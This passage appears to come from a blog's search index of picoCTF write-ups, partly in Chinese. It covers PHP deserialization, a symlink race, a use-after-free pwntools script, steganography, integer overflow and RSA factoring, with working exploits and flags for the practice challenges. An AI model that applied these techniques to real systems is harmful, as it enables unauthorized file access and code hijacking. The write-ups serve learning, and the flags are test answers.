\u0026#34;.$perm); } } Exploit - Unserialization # php -a $ php -a Interactive mode enabled php \u0026gt; class access_log php \u0026gt; { php { public $log_file; php { php { function __construct($lf) { php { $this-\u0026gt;log_file = $lf; php { } php { php { function __toString() { php { return $this-\u0026gt;read_log(); php { } php { php { function append_to_log($data) { php { file_put_contents($this-\u0026gt;log_file, $data, FILE_APPEND); php { } php { php { function read_log() { php { return file_get_contents($this-\u0026gt;log_file); php { } php { } php \u0026gt; echo urlencode(base64_encode(serialize(new access_log(\u0026#34;../flag\u0026#34;)))); TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 建一個cookie然後access authentication.phps Flag: picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}\nReference # picoCTF 2021 Super Serial "},{"id":327,"href":"/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/","title":"PicoCTF - Surfing the Waves","section":"Securities","content":" PicoCTF - Surfing the Waves # tags: PicoCTF CTF Misc # Challenge: Surfing the Waves\nDescription \u0026amp; Hint # While you\u0026rsquo;re going through the FBI\u0026rsquo;s servers, you stumble across their incredible taste in music. One main.wav you found is particularly interesting, see if you can find the flag! Hint:\nMusic is cool, but what other kinds of waves are there? Look deep below the surface Exploit - 通靈 # Audacity to Analyze The sound seems quite normal but when you zoom in the audio track, it looks like something encode. Read it - scipy.io Use scipy.io library to read it and print the data out. \u0026gt;\u0026gt;\u0026gt; from scipy.io.wavfile import read \u0026gt;\u0026gt;\u0026gt; rate, data = read(\u0026#34;./main.wav\u0026#34;) \u0026gt;\u0026gt;\u0026gt; print(data) [2007 2503 2005 ... 4503 4501 7501] \u0026gt;\u0026gt;\u0026gt; import numpy as np \u0026gt;\u0026gt;\u0026gt; print(np.unique(data)) [1000 1001 1002 1003 1004 1005 1006 1007 1008 1009 1500 1501 1502 1503 1504 1505 1506 1507 1508 1509 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2500 2501 2502 2503 2504 2505 2506 2507 2508 2509 3000 3001 3002 3003 3004 3005 3006 3007 3008 3009 3500 3501 3502 3503 3504 3505 3506 3507 3508 3509 4000 4001 4002 4003 4004 4005 4006 4007 4008 4009 4500 4501 4502 4503 4504 4505 4506 4507 4508 4509 5000 5001 5002 5003 5004 5005 5006 5007 5008 5009 5500 5501 5502 5503 5504 5505 5506 5507 5508 5509 6000 6001 6002 6003 6004 6005 6006 6007 6008 6009 6500 6501 6502 6503 6504 6505 6506 6507 6508 6509 7000 7001 7002 7003 7004 7005 7006 7007 7008 7009 7500 7501 7502 7503 7504 7505 7506 7507 7508 7509 8000 8001 8002 8003 8004 8005 8006 8007 8008 8009 8500 8501 8502 8503 8504 8505 8506 8507 8508 8509] Seems it has some rule $\\to$ 1000 ~ 1009 1500 ~ 1509 2000 ~ 2009 \u0026hellip; 8500 ~ 8509 It has exactly 16 intervals $\\to$ hex value Let\u0026rsquo;s try to exploit it Whole exploit :::spoiler exploit from scipy.io.wavfile import read from tqdm import trange path = \u0026#39;.\u0026#39; rate, data = read(path + \u0026#34;/main.wav\u0026#34;) decode_dic = { 10 : \u0026#34;0\u0026#34;, 15 : \u0026#34;1\u0026#34;, 20 : \u0026#34;2\u0026#34;, 25 : \u0026#34;3\u0026#34;, 30 : \u0026#34;4\u0026#34;, 35 : \u0026#34;5\u0026#34;, 40 : \u0026#34;6\u0026#34;, 45 : \u0026#34;7\u0026#34;, 50 : \u0026#34;8\u0026#34;, 55 : \u0026#34;9\u0026#34;, 60 : \u0026#34;A\u0026#34;, 65 : \u0026#34;B\u0026#34;, 70 : \u0026#34;C\u0026#34;, 75 : \u0026#34;D\u0026#34;, 80 : \u0026#34;E\u0026#34;, 85 : \u0026#34;F\u0026#34;, } message = \u0026#39;\u0026#39; for i in trange(len(data)): message += decode_dic[data[i] // 100] print(bytes.fromhex(message).decode()) ::: Then you can get the source code and flag\u0026hellip; Reference # picoCTF 2021 Surfing the Waves\n"},{"id":328,"href":"/security/practice/picoctf/pwn/picoctf---tic-tac/","title":"PicoCTF - tic-tac","section":"Securities","content":" PicoCTF - tic-tac # Background # 後端工程師面試考什麼 - Race Condition 篇 [Day24]攻擊篇 TOCTTOU\nTime of check to time of use 在檢查和使用之間影響資源狀態的攻擊\n這種攻擊可能發生在共享資源中。 可能導致程式在資源處於意外狀態時執行無效操作。\nSource code # :::spoiler Source code\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; int main(int argc, char *argv[]) { if (argc != 2) { std::cerr \u0026lt;\u0026lt; \u0026#34;Usage: \u0026#34; \u0026lt;\u0026lt; argv[0] \u0026lt;\u0026lt; \u0026#34; \u0026lt;filename\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } std::string filename = argv[1]; std::ifstream file(filename); struct stat statbuf; // Check the file\u0026#39;s status information. if (stat(filename.c_str(), \u0026amp;statbuf) == -1) { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: Could not retrieve file information\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Check the file\u0026#39;s owner. if (statbuf.st_uid != getuid()) { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: you don\u0026#39;t own this file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Read the contents of the file. if (file.is_open()) { std::string line; while (getline(file, line)) { std::cout \u0026lt;\u0026lt; line \u0026lt;\u0026lt; std::endl; } } else { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: Could not open file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } return 0; } :::\nRecon # 第一次寫這一種題目，具@ccccctw所說算是考古題了，看了123還是不知道怎麼做出來的，所以問了@ccccctw\n可以看到source code是檢查root權限才可以讀到flag 用兩次soft link讓這支程式呈現race condiction的狀態(不見得每次都會所以要靠賽) 首先要先用一個infinity while loop創兩個soft link，然後在背景執行，第一次的soft link($ ln -sf test1 test)是為了要過掉root權限的檢查，而第二次的soft link(ln -sf flag.txt test)是用來讀flag的 具體來說是這樣： test的link會在flag.txt和test1之間切換，若我們用txtreader讀取test時，會有權限檢查，如果此時的link是test1，權限檢查就會通過，此時如果剛好test的link指向flag.txt，那我們就可以無縫的讀取到flag.txt的內容 接著就可以用他的txtreader讀取test，如果幸運的話就可以讀到需要root權限的flag Exploit # $ ssh ctf-player@saturn.picoctf.net -p 59620 $ touch test1 $ while true; do ln -sf flag.txt test; ln -sf test1 test; done \u0026amp; [1] 3039 $ for i in {1..1000};do ./txtreader test; done \u0026gt; output $ cat output picoCTF{ToctoU_!s_3a5y_007659c9} picoCTF{ToctoU_!s_3a5y_007659c9} picoCTF{ToctoU_!s_3a5y_007659c9} picoCTF{ToctoU_!s_3a5y_007659c9} picoCTF{ToctoU_!s_3a5y_007659c9} picoCTF{ToctoU_!s_3a5y_007659c9} Flag: picoCTF{ToctoU_!s_3a5y_007659c9}\nReference # tic-tac maple\u0026#160;\u0026#x21a9;\u0026#xfe0e;\npicoCTF 2023 tic-tac\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nTicTac (TOCTOU attack) - Pico CTF 2023 - Race Condition \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":329,"href":"/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/","title":"PicoCTF - Torrent Analyze","section":"Securities","content":" PicoCTF - Torrent Analyze # Background # What are seeds, peers and leechers in Torrents’ language? 慎選peer，是加速BT下載的王道！\nseed個數：seed（即一般所說的「種子」）意指擁有完整檔案的BT參與者，是主要的檔案提供者。seed越多，可用的BT分享頻寬就越多，速度當然就快。 seed與peer的比例：雖然peer（指尚未取得完整檔案的BT參與者）可同時自seed與其他peer下載檔案，但peer間會彼此競爭，以爭取有限的BT下載頻寬。因此，peer個數越多，分配後的BT分享頻寬就越少，速度自然就受影響。 教你該如何使用bt的info hash特徵碼，下載BT之torrent種子檔\nDescription \u0026amp; Hint # SOS, someone is torrenting on our network. One of your colleagues has been using torrent to download some files on the company’s network. Can you identify the file(s) that were downloaded? The file name will be the flag, like picoCTF{filename}. Hint 1: Download and open the file with a packet analyzer like Wireshark. Hint 2: You may want to enable BitTorrent protocol (BT-DHT, etc.) on Wireshark. Analyze -\u0026gt; Enabled Protocols Hint 3: Try to understand peers, leechers and seeds. Article Hint 4: The file name ends with .iso\nRecon # 這是非常有趣的題目，不過完全沒有用過bittorrent或是info hash相關的背景知識，所以看了1的WP覺得學到很多\n簡單來說，這支pcap紀錄了利用bittorrent下載/上傳的流量，而我們要找出他下載/上傳的file name為何，有趣的地方是利用bittorrent這種P2P的方式，一定會自帶一個file的info hash，驗明正身，所以我們只要找到BT-UDP protocol中，有夾帶info-hash的packet出來，再丟到網路上查詢就可以了 Set Filter as bt-dht contains \u0026quot;info_hash\u0026quot; 設定filter後，就可以看到每一個bt-dht protocol packets都含有info_hash的keys，不過其中有很多不同的info hash所以要一個一個試很麻煩就寫了一個script dump出來，最後只有8個，不過如果把全部packet不管有沒有重複全部print出來的話，很明顯最後一個e2467cbf021192c241367b892230dc1e05c0580e是最多的，那這個應該就是答案，因為.iso通常都很大，所以下載的packets數量應該是比較多的 Exploit # import pyshark capture = pyshark.FileCapture(\u0026#39;PicoCTF/Misc/Torrent Analyze/torrent.pcap\u0026#39;, display_filter=\u0026#39;bt-dht contains \u0026#34;info_hash\u0026#34;\u0026#39;) info_hashs = [] for pkt in capture: info_hash = pkt.layers[3].get_field_by_showname(\u0026#39;info_hash\u0026#39;).showname_value if info_hash not in info_hashs: print(info_hash) info_hashs.append(info_hash) 17d62de1495d4404f6fb385bdfd7ead5c897ea22 17c1e42e811a83f12c697c21bed9c72b5cb3000d d59b1ce3bf41f1d282c1923544629062948afadd 078e18df4efe53eb39d3425e91d1e9f4777d85ac 7af6be54c2ed4dcb8d17bf599516b97bb66c0bfd 17c0c2c3b7825ba4fbe2f8c8055e000421def12c 17c02f9957ea8604bc5a04ad3b56766a092b5556 e2467cbf021192c241367b892230dc1e05c0580e Info Hash: e2467cbf021192c241367b892230dc1e05c0580e File Name: ubuntu-19.10-desktop-amd64.iso Flag: picoCTF{ubuntu-19.10-desktop-amd64.iso} Reference # picoGym (picoCTF) Exercise: Torrent Analyze \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":330,"href":"/security/practice/picoctf/reverse/picoctf---transformation/","title":"PicoCTF - Transformation","section":"Securities","content":" PicoCTF - Transformation # tags: PicoCTF CTF Reverse # Challenge: Transformation\nSource code # enc file content: 灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽 Transformation Code\n\u0026#39;\u0026#39;.join([chr((ord(flag[i]) \u0026lt;\u0026lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) Seems it shift the first character with 8 bits and concatenate the 2nd character then go through len(flag)\nExploit # My perspective is just recover the strings :::spoiler\nflag = \u0026#39;灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽\u0026#39; enc = \u0026#39;\u0026#39; def decimalToBinary(n): return bin(n).replace(\u0026#34;0b\u0026#34;, \u0026#34;\u0026#34;) def binToHexa(n): bnum = int(n) temp = 0 mul = 1 count = 1 hexaDeciNum = [\u0026#39;0\u0026#39;] * 100 i = 0 while bnum != 0: rem = bnum % 10 temp = temp + (rem*mul) if count % 4 == 0: if temp \u0026lt; 10: hexaDeciNum[i] = chr(temp+48) else: hexaDeciNum[i] = chr(temp+55) mul = 1 temp = 0 count = 1 i = i+1 else: mul = mul*2 count = count+1 bnum = int(bnum/10) if count != 1: hexaDeciNum[i] = chr(temp+48) if count == 1: i = i-1 hex_string = \u0026#39;\u0026#39; while i \u0026gt;= 0: hex_string += hexaDeciNum[i] i = i-1 return hex_string for i in range(0, len(flag)): plaintext1 = decimalToBinary(ord(flag[i])) while(len(plaintext1) != 16): plaintext1 = \u0026#39;0\u0026#39; + plaintext1 plaintext2 = plaintext1[-8:] plaintext1 = plaintext1[0:8] enc += binToHexa(plaintext1) enc += binToHexa(plaintext2) print(bytes.fromhex(enc).decode(\u0026#39;utf-8\u0026#39;)) :::\n"},{"id":331,"href":"/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/","title":"PicoCTF - Trivial Flag Transfer Protocol","section":"Securities","content":" PicoCTF - Trivial Flag Transfer Protocol # tags: PicoCTF CTF Misc # Challenge: Trivial Flag Transfer Protocol\nBackground # TFTP協定是什麼？\nWireless router中的UPnP是做什麼用的?\nUPnP 是一種通訊協定，其主要功能是供家中的設備可以輕易的且自動的連結到網路並完成網路相關設定。 不需要您本人手動去設定就可以使用的意思。 所以你的 router 有支援並打開這項功能後，您家中的視訊設備（大部分都是支援UPnP）接上網路、打開電源。 接著你的 作業系統也支援的話，以winodws 為例，「我的電腦」中就會看到您新增的設備，如無線router、media server等等。\nSSDP - 通訊協定 ?\nSSDP的全寫是「Simple Service Discovery Protocol」，使用在Universal Plug and Play (UPnP)網絡環境中。SSDP使用UDP1900連接埠搜尋互聯網上的數據。當SSDP開啟時，其他設置會曝露自己到所有UPnP的用戶端中。\nsteghide instruction\nExploit - TFTP + steghide # Save files According to the article: TFTP協定是什麼？, we can aware that this protocol is aim to transfer the data without authentication. So, we can download the files using wireshark. Check files Check instructions.txt first. Seems encoding by rot13 $\\to$ TFTP DOESNT ENCRYPT OUR TRAFFIC SO WE MUST DISGUISE OUR FLAG TRANSFER. FIGURE OUT A WAY TO HIDE THE FLAG AND I WILL CHECK BACK FOR THE PLAN.\nCheck plan file next. Seems encoded by rot13 again $\\to$ I USED THE PROGRAM AND HID IT WITH - DUEDILIGENCE. CHECK OUT THE PHOTOS. The author seems hide some files in transferred photos.\nsteghide $ steghide info picture1.bmp \u0026#34;picture1.bmp\u0026#34;: format: Windows 3.x bitmap capacity: 33.5 KB Try to get information about embedded data ? (y/n) y Enter passphrase: steghide: could not extract any data with that passphrase! $ steghide info picture2.bmp \u0026#34;picture2.bmp\u0026#34;: format: Windows 3.x bitmap capacity: 1.5 MB Try to get information about embedded data ? (y/n) y Enter passphrase: steghide: could not extract any data with that passphrase! $ steghide info picture3.bmp \u0026#34;picture3.bmp\u0026#34;: format: Windows 3.x bitmap capacity: 59.6 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;flag.txt\u0026#34;: size: 40.0 Byte encrypted: rijndael-128, cbc compressed: yes Note that the passphrace must enter DUEDILIGENCE that author gave us. Seems picture3.bmp has something $ steghide extract -sf picture3.bmp Enter passphrase: wrote extracted data to \u0026#34;flag.txt\u0026#34;. $ cat flag.txt picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919} Reference # picoCTF 2021 Trivial Flag Transfer Protocol\n"},{"id":332,"href":"/security/practice/picoctf/pwn/picoctf---two-sum/","title":"PicoCTF - two-sum","section":"Securities","content":" PicoCTF - two-sum # Background # BoF\nSource code # :::spoiler\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; static int addIntOvf(int result, int a, int b) { result = a + b; if(a \u0026gt; 0 \u0026amp;\u0026amp; b \u0026gt; 0 \u0026amp;\u0026amp; result \u0026lt; 0) return -1; if(a \u0026lt; 0 \u0026amp;\u0026amp; b \u0026lt; 0 \u0026amp;\u0026amp; result \u0026gt; 0) return -1; return 0; } int main() { int num1, num2, sum; FILE *flag; char c; printf(\u0026#34;n1 \u0026gt; n1 + n2 OR n2 \u0026gt; n1 + n2 \\n\u0026#34;); fflush(stdout); printf(\u0026#34;What two positive numbers can make this possible: \\n\u0026#34;); fflush(stdout); if (scanf(\u0026#34;%d\u0026#34;, \u0026amp;num1) \u0026amp;\u0026amp; scanf(\u0026#34;%d\u0026#34;, \u0026amp;num2)) { printf(\u0026#34;You entered %d and %d\\n\u0026#34;, num1, num2); fflush(stdout); sum = num1 + num2; if (addIntOvf(sum, num1, num2) == 0) { printf(\u0026#34;No overflow\\n\u0026#34;); fflush(stdout); exit(0); } else if (addIntOvf(sum, num1, num2) == -1) { printf(\u0026#34;You have an integer overflow\\n\u0026#34;); fflush(stdout); } if (num1 \u0026gt; 0 || num2 \u0026gt; 0) { flag = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if(flag == NULL){ printf(\u0026#34;flag not found: please run this on the server\\n\u0026#34;); fflush(stdout); exit(0); } char buf[60]; fgets(buf, 59, flag); printf(\u0026#34;YOUR FLAG IS: %s\\n\u0026#34;, buf); fflush(stdout); exit(0); } } return 0; } :::\nRecon # 以初學的角度來說還蠻有趣的，看了一下source code，顯然是要滿足addIntOvf()的條件，也就是輸入的兩個數都大於零，但相加小於零，==OR==，兩個數都小於零但相加卻大於零，我是用第一種啦，比較直觀，首先輸入兩個超大的數，但還落在int正數的範圍，這樣就可以滿足一開始都大於零的條件，接著相加就會落在int負數的地方，這樣就滿足第三個條件，我有再另外輸入一次，這次是$9999999999999999+9999999999999999=19999999999999998$，這個就落在int負數的地方，解析出來的結果是-545128450\nExploit # $ nc saturn.picoctf.net 50369 n1 \u0026gt; n1 + n2 OR n2 \u0026gt; n1 + n2 What two positive numbers can make this possible: 9999999999999999 9999999999999999 You entered 1874919423 and 1874919423 You have an integer overflow YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_482d8fc4} $ nc saturn.picoctf.net 58903 n1 \u0026gt; n1 + n2 OR n2 \u0026gt; n1 + n2 What two positive numbers can make this possible: 19999999999999998 19999999999999998 You entered -545128450 and -545128450 No overflow "},{"id":333,"href":"/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/","title":"PicoCTF - Unsubscriptions Are Free","section":"Securities","content":" PicoCTF - Unsubscriptions Are Free # Background # Heap Exploitation / Used After Free\nSource code # :::spoiler Source Code\n#include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr(){ char buf[FLAG_BUFFER]; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); fgets(buf,FLAG_BUFFER,f); fprintf(stdout,\u0026#34;%s\\n\u0026#34;,buf); fflush(stdout); } char * getsline(void) { getchar(); char * line = malloc(100), * linep = line; size_t lenmax = 100, len = lenmax; int c; if(line == NULL) return NULL; for(;;) { c = fgetc(stdin); if(c == EOF) break; if(--len == 0) { len = lenmax; char * linen = realloc(linep, lenmax *= 2); if(linen == NULL) { free(linep); return NULL; } line = linen + (line - linep); linep = linen; } if((*line++ = c) == \u0026#39;\\n\u0026#39;) break; } *line = \u0026#39;\\0\u0026#39;; return linep; } void doProcess(cmd* obj) { (*obj-\u0026gt;whatToDo)(); } void s(){ printf(\u0026#34;OOP! Memory leak...%p\\n\u0026#34;,hahaexploitgobrrr); puts(\u0026#34;Thanks for subsribing! I really recommend becoming a premium member!\u0026#34;); } void p(){ puts(\u0026#34;Membership pending... (There\u0026#39;s also a super-subscription you can also get for twice the price!)\u0026#34;); } void m(){ puts(\u0026#34;Account created.\u0026#34;); } void leaveMessage(){ puts(\u0026#34;I only read premium member messages but you can \u0026#34;); puts(\u0026#34;try anyways:\u0026#34;); char* msg = (char*)malloc(8); read(0, msg, 8); } void i(){ char response; puts(\u0026#34;You\u0026#39;re leaving already(Y/N)?\u0026#34;); scanf(\u0026#34; %c\u0026#34;, \u0026amp;response); if(toupper(response)==\u0026#39;Y\u0026#39;){ puts(\u0026#34;Bye!\u0026#34;); free(user); }else{ puts(\u0026#34;Ok. Get premium membership please!\u0026#34;); } } void printMenu(){ puts(\u0026#34;Welcome to my stream! ^W^\u0026#34;); puts(\u0026#34;==========================\u0026#34;); puts(\u0026#34;(S)ubscribe to my channel\u0026#34;); puts(\u0026#34;(I)nquire about account deletion\u0026#34;); puts(\u0026#34;(M)ake an Twixer account\u0026#34;); puts(\u0026#34;(P)ay for premium membership\u0026#34;); puts(\u0026#34;(l)eave a message(with or without logging in)\u0026#34;); puts(\u0026#34;(e)xit\u0026#34;); } void processInput(){ scanf(\u0026#34; %c\u0026#34;, \u0026amp;choice); choice = toupper(choice); switch(choice){ case \u0026#39;S\u0026#39;: if(user){ user-\u0026gt;whatToDo = (void*)s; }else{ puts(\u0026#34;Not logged in!\u0026#34;); } break; case \u0026#39;P\u0026#39;: user-\u0026gt;whatToDo = (void*)p; break; case \u0026#39;I\u0026#39;: user-\u0026gt;whatToDo = (void*)i; break; case \u0026#39;M\u0026#39;: user-\u0026gt;whatToDo = (void*)m; puts(\u0026#34;===========================\u0026#34;); puts(\u0026#34;Registration: Welcome to Twixer!\u0026#34;); puts(\u0026#34;Enter your username: \u0026#34;); user-\u0026gt;username = getsline(); break; case \u0026#39;L\u0026#39;: leaveMessage(); break; case \u0026#39;E\u0026#39;: exit(0); default: puts(\u0026#34;Invalid option!\u0026#34;); exit(1); break; } } int main(){ setbuf(stdout, NULL); user = (cmd *)malloc(sizeof(user)); while(1){ printMenu(); processInput(); //if(user){ doProcess(user); //} } return 0; } :::\nRecon # 這題該怎麼說呢，有點像是被設計好的問題\n首先觀察整體的file $ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=89699d062dc4f47448ba7c5c03105267c060ce30, not stripped $ checksec vuln [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/Unsubscriptions Are Free/vuln\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 保護機制雖然沒有全開，不過應該是一個heap題 source code有一個hahaexploitgobrrr function，是print出flag的function所以我們的目標很明確，就是要想辦法踩到這個function，而s()/p()/m()都是無用的資訊 遇到這種heap的題目，我會先看哪裡有malloc和free，確保幾個簡單的exploitation的可能性，例如uaf或double free之類的，而i function有一個free，是要註銷帳號的功能，但是main function中的doProcess(user);卻持續使用user這個變數，所以這個就是一個典型的UAF漏洞(我也是看了別人的WP12後才知道他的題目已經有提示了，一開始是我想的太複雜了)，試想如果一開始我先輸入i，讓程式free(user)，接著他就會執行doProcess(user)也就是user指向的function pointer，如果我們可以拿到被free掉的user這個chunk然後輸入hahaexploitgobrrr這個function的address，那我們就可以拿到flag了 所以重點來了，要怎麼拿到被free掉的chunk呢?這個程式==也很好心的==幫我們實作了leaveMessage這個function，他會malloc 8 bytes，其實就剛好是user的大小，所以如果要拿8 bytes的chunk他會先到Tcache搜尋，然後給我們寫一些資訊，此時我們就可以寫上hahaexploitgobrrr這個function的address(address的資訊可以透過s function得知) 綜合以上資訊可以開寫script Exploit # from pwn import * r = process(\u0026#39;./vuln\u0026#39;) # r = remote(\u0026#39;mercury.picoctf.net\u0026#39;, 61817) r.recvuntil(b\u0026#39;(e)xit\\n\u0026#39;) r.sendline(b\u0026#39;i\u0026#39;) r.recvuntil(b\u0026#34;You\u0026#39;re leaving already(Y/N)?\\n\u0026#34;) r.sendline(b\u0026#39;Y\u0026#39;) r.recvuntil(b\u0026#39;(e)xit\\n\u0026#39;) r.sendline(b\u0026#39;s\u0026#39;) r.recvuntil(b\u0026#39;OOP! Memory leak...0x\u0026#39;) hahaexploitgobrrr_addr = int(str(r.recv(7))[2:-1], 16) success(hahaexploitgobrrr_addr) r.recvuntil(b\u0026#39;(e)xit\\n\u0026#39;) r.sendline(b\u0026#39;l\u0026#39;) r.recvuntil(b\u0026#39;try anyways:\\n\u0026#39;) raw_input() r.sendline(p64(hahaexploitgobrrr_addr)) success(f\u0026#39;Flag: {r.recvline().strip().decode()}\u0026#39;) r.close() Reference # picoCTF 2021 Unsubscriptions Are Free \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUnsubscriptions Are Free WP\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":334,"href":"/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/","title":"PicoCTF - Very Smooth","section":"Securities","content":" PicoCTF - Very Smooth # tags: PicoCTF CTF Crypto # Background # $p-1$ Smooth\nSource code # :::spoiler Source Code\n#!/usr/bin/python from binascii import hexlify from gmpy2 import * import math import os import sys if sys.version_info \u0026lt; (3, 9): math.gcd = gcd math.lcm = lcm _DEBUG = False FLAG = open(\u0026#39;flag.txt\u0026#39;).read().strip() FLAG = mpz(hexlify(FLAG.encode()), 16) SEED = mpz(hexlify(os.urandom(32)).decode(), 16) STATE = random_state(SEED) def get_prime(state, bits): return next_prime(mpz_urandomb(state, bits) | (1 \u0026lt;\u0026lt; (bits - 1))) def get_smooth_prime(state, bits, smoothness=16): p = mpz(2) p_factors = [p] while p.bit_length() \u0026lt; bits - 2 * smoothness: factor = get_prime(state, smoothness) p_factors.append(factor) p *= factor bitcnt = (bits - p.bit_length()) // 2 while True: prime1 = get_prime(state, bitcnt) prime2 = get_prime(state, bitcnt) tmpp = p * prime1 * prime2 if tmpp.bit_length() \u0026lt; bits: bitcnt += 1 continue if tmpp.bit_length() \u0026gt; bits: bitcnt -= 1 continue if is_prime(tmpp + 1): p_factors.append(prime1) p_factors.append(prime2) p = tmpp + 1 break p_factors.sort() return (p, p_factors) e = 0x10001 while True: p, p_factors = get_smooth_prime(STATE, 1024, 16) if len(p_factors) != len(set(p_factors)): continue # Smoothness should be different or some might encounter issues. q, q_factors = get_smooth_prime(STATE, 1024, 17) if len(q_factors) != len(set(q_factors)): continue factors = p_factors + q_factors if e not in factors: break if _DEBUG: import sys sys.stderr.write(f\u0026#39;p = {p.digits(16)}\\n\\n\u0026#39;) sys.stderr.write(f\u0026#39;p_factors = [\\n\u0026#39;) for factor in p_factors: sys.stderr.write(f\u0026#39; {factor.digits(16)},\\n\u0026#39;) sys.stderr.write(f\u0026#39;]\\n\\n\u0026#39;) sys.stderr.write(f\u0026#39;q = {q.digits(16)}\\n\\n\u0026#39;) sys.stderr.write(f\u0026#39;q_factors = [\\n\u0026#39;) for factor in q_factors: sys.stderr.write(f\u0026#39; {factor.digits(16)},\\n\u0026#39;) sys.stderr.write(f\u0026#39;]\\n\\n\u0026#39;) n = p * q m = math.lcm(p - 1, q - 1) d = pow(e, -1, m) c = pow(FLAG, e, n) print(f\u0026#39;n = {n.digits(10)}\u0026#39;) print(f\u0026#39;c = {c.digits(10)}\u0026#39;) :::\nn = 4f7aa864f662a42a92220e372f5ff25a142aef26106a0dbdf573a66594966ac5dd03848745bb6a80402cad7ac6f2bf93f9ed840edd9c157dfd5d265ce2403e155a29666df8f9b98167ad2452e5a63fd0b7b14ffe966db60c6e2c65b0f602f5c22eb030c0335187759909abd4df622118c23463bcc42650e0a7761257452bf40069ca50dbe0c922d8823a9dcc4231b3952d31d1e977cb520528c6a450405f2a2ee6134db8c61ceb4478a647b0469712cc4f3d1369ef3dfd3d876a2c77bac5a149ccf3723a6e8c3ba1deb0675f25def8da9de2b3ac8b3e38d5ac5c9736b9af087b3fc53450136428e07d58fbc00f6609a4cc14eb0a13a7e76056a241256e03e95d c = e41a61908eb48b85dc78975c288e62a271b1f237fdc958162727d2930b9af850e908137655c5955a078ff1aa63f5509fbaf79d179d24d209a061c36e0709437b8d2641f41d354bdea062084ea3be8637ed1c4bd8cf63d16c942976dd9d6188fc5e419afae17493d7cdb93d84052637d15e7fa1f852f4f5d786c86bfd024df0dfcf8431e7230cfbbce76a1835b178020ef839af42c377706918a50aac56f79285d743f4a177425eb00eaeb2bebe99343911ab653fe64bb61e140153b113f8554fe29561756fafc7460683d59dd3ee50eb48b718443b9f49e663b6dd02b0a15297468ec30a4f487e328103cdbc59d1d66fc4f03ef75ae45d6ce2035fdfaeb86b7 Recon # 相關的證明可以直接看背景知識的連結，但還是可以分析一下Source Code\n55-65行先產生$p$和$q$，產生的方式是call get_smooth_prime function 詳細進去看會發現26-29行有一個while loop是產生基本的$p$，而產生prime number的bit length被設定在$2^{15}$，而跳出loop的條件是$p_1p_2p_3p_4\u0026hellip;=p$的bit length大於$1024-2*16=992$，所以此時的$p$已經是一個smooth value 接著看下面的while loop，發現會先產生兩個prime，而且entropy也很低，只有10多個bits而已，而跳出while loop的條件是第43行的判斷式，當$p=p * prime_1 * prime_2+1$是質數時就會跳出來，而這也符合一開始的解題思路，就是$p-1$是smooth value Exploit - $p-1$ Smooth # from gmpy2 import * from Crypto.Util.number import long_to_bytes a = 2 n = 2 N = \u0026#34;4f7aa864f662a42a92220e372f5ff25a142aef26106a0dbdf573a66594966ac5dd03848745bb6a80402cad7ac6f2bf93f9ed840edd9c157dfd5d265ce2403e155a29666df8f9b98167ad2452e5a63fd0b7b14ffe966db60c6e2c65b0f602f5c22eb030c0335187759909abd4df622118c23463bcc42650e0a7761257452bf40069ca50dbe0c922d8823a9dcc4231b3952d31d1e977cb520528c6a450405f2a2ee6134db8c61ceb4478a647b0469712cc4f3d1369ef3dfd3d876a2c77bac5a149ccf3723a6e8c3ba1deb0675f25def8da9de2b3ac8b3e38d5ac5c9736b9af087b3fc53450136428e07d58fbc00f6609a4cc14eb0a13a7e76056a241256e03e95d\u0026#34; e = 65537 c = 